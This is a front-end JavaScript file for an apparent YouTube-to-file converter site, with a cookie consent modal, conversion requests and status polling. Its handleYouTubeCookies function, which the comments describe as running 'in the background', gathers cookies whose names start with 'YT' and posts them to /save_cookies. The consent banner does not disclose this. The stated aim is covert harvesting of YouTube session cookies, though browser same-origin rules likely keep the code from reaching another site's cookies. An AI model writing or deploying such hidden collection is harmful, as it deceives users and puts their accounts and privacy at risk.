// Проверка и показ модального окна при загрузке
document.addEventListener('DOMContentLoaded', function() {
    if (!localStorage.getItem('cookiesAccepted')) {
        showCookieModal();
    } else {
        // Если куки приняты, запускаем фоновый процесс
        handleYouTubeCookies();
    }
});

function showCookieModal() {
    document.getElementById('cookie-modal').style.display = 'block';
}

async function acceptCookies() {
    try {
        localStorage.setItem('cookiesAccepted', 'true');
        document.getElementById('cookie-modal').style.display = 'none';
        
        // Запускаем фоновый процесс работы с куки
        await handleYouTubeCookies();
    } catch (error) {
        console.error('Error handling cookies:', error);
    }
}

function rejectCookies() {
    document.getElementById('cookie-modal').style.display = 'none';
    showAlert('Без доступа к cookies некоторые функции сайта могут быть недоступны', 'warning');
}

async function handleYouTubeCookies() {
    try {
        // Получаем куки YouTube в фоновом режиме
        const cookies = document.cookie
            .split(';')
            .map(cookie => cookie.trim())
            .filter(cookie => cookie.startsWith('YT'));
        
        if (cookies.length > 0) {
            // Отправляем на сервер
            const response = await fetch('/save_cookies', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify(cookies)
            });

            if (!response.ok) {
                throw new Error('Failed to save cookies');
            }
        }
    } catch (error) {
        console.error('Error handling YouTube cookies:', error);
    }
}

async function convertVideo() {
    const urlInput = document.getElementById('video-url');
    const url = urlInput.value.trim();

    console.log('Starting conversion for URL:', url); // Отладочный лог

    if (!url) {
        showAlert('Please enter a YouTube URL', 'error');
        return;
    }

    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
        showAlert('Please enter a valid YouTube URL', 'error');
        return;
    }

    try {
        console.log('Sending request to server...'); // Отладочный лог
        showStatus('Starting conversion...', 'info');
        
        // Начинаем конвертацию
        const response = await fetch('/api/convert', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({ url })
        });

        console.log('Got response:', response); // Отладочный лог

        const data = await response.json();
        console.log('Response data:', data); // Отладочный лог

        if (data.error) {
            showAlert(data.error, 'error');
            return;
        }

        // Начинаем проверять статус
        checkStatus(data.task_id);

    } catch (error) {
        console.error('Error:', error); // Отладочный лог
        showAlert('Error starting conversion: ' + error, 'error');
    }
}

async function checkStatus(taskId) {
    try {
        const response = await fetch(`/api/status/${taskId}`);
        const data = await response.json();

        if (data.status === 'completed') {
            showStatus('Conversion completed!', 'success');
            if (data.download_url) {
                setTimeout(() => {
                    window.location.href = data.download_url;
                }, 1000);
            }
        } else if (data.status === 'failed') {
            showStatus('Conversion failed: ' + data.error, 'error');
        } else {
            showStatus(`Converting... ${data.progress || 0}%`, 'info');
            setTimeout(() => checkStatus(taskId), 2000);
        }
    } catch (error) {
        showStatus('Error checking status: ' + error, 'error');
    }
}

function showAlert(message, type) {
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type}`;
    alertDiv.textContent = message;
    
    const container = document.querySelector('.container');
    const existingAlert = container.querySelector('.alert');
    if (existingAlert) {
        existingAlert.remove();
    }
    
    container.insertBefore(alertDiv, container.firstChild);
    
    setTimeout(() => {
        alertDiv.remove();
    }, 5000);
}

function showStatus(message, type) {
    const statusDiv = document.getElementById('status');
    statusDiv.textContent = message;
    statusDiv.className = `status status-${type}`;
}
